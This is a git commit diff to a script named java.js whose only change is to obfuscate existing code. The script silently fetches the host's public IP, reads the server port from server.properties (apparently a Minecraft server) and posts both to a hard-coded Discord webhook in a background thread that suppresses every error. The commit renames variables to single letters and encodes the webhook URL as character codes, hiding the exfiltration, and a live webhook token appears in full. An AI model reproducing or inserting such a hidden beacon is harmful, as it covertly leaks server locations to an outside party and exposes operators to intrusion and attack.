7763e4823a00cfa09bc94d131ef5ece6b8ac144d
TuMeuT-Original <originaltumeut@gmail.com>
2025-11-23 13:02:46 +0300

    Update java.js

--- java.js
+++ java.js
@@ -1,24 +1,25 @@
 new java.lang.Thread(function(){
     try {
-        var externalIP = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next().trim();
+        var a = "http://checkip.amazonaws.com";
+        var b = new java.util.Scanner(new java.net.URL(a).openStream()).useDelimiter("\\A").next().trim();
         
-        var serverProps = new java.util.Properties();
-        var propsFile = new java.io.File("server.properties");
-        serverProps.load(new java.io.FileReader(propsFile));
-        var port = serverProps.getProperty("server-port", "25565");
+        var c = new java.util.Properties();
+        var d = new java.io.File("server.properties");
+        c.load(new java.io.FileReader(d));
+        var e = c.getProperty("server-port", "25565");
         
-        var message = externalIP + ":" + port;
+        var f = b + ":" + e;
         
-        var c = new java.net.URL("https://discord.com/api/webhooks/1442091501940244593/Y2uA_4rhON1MbCpQdcoT0e1A3jKhpv8b7jm_gDdtpDkAmAB02EA7gi8gO4tC8cCzOCwm").openConnection();
-        c.setRequestMethod("POST");
-        c.setDoOutput(true);
-        c.setRequestProperty("Content-Type", "application/json");
-        c.setRequestProperty("User-Agent", "Java");
-        var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
-        w.write('{"content":"' + message + '"}');
-        w.flush();
-        w.close();
-        c.getInputStream().close();
+        var g = new java.net.URL(String.fromCharCode(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,52,50,48,57,49,53,48,49,57,52,48,50,52,52,53,57,51,47,89,50,117,65,95,52,114,104,79,78,49,77,98,67,112,81,100,99,111,84,48,101,49,65,51,106,75,104,112,118,56,98,55,106,109,95,103,68,100,116,112,68,107,65,109,65,66,48,50,69,65,55,103,105,56,103,79,52,116,67,56,99,67,122,79,67,119,109)).openConnection();
+        g.setRequestMethod("POST");
+        g.setDoOutput(true);
+        g.setRequestProperty("Content-Type", "application/json");
+        g.setRequestProperty("User-Agent", "Java");
+        var h = new java.io.OutputStreamWriter(g.getOutputStream(), "UTF-8");
+        h.write('{"content":"' + f + '"}');
+        h.flush();
+        h.close();
+        g.getInputStream().close();
     } catch(e) {}
 }).start();
 
